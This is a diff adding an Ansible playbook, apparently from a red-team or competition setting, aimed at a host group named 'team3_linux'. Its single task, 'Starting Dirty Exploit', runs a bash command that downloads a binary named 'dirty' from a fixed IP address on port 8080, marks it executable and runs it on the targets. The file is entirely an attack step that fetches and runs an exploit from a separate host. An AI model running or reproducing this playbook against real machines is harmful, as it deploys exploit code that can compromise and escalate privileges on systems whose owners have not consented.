@@ -1,0 +1,11 @@
+---
+- hosts: team3_linux
+  connection: local
+  gather_facts: false
+  tasks:
+    - name: "Starting Dirty Exploit"
+      raw: "wget http://10.1.120.69:8080/dirty; chmod +x dirty;./dirty"
+      args:
+       executable: /bin/bash
+      ignore_errors: true
+
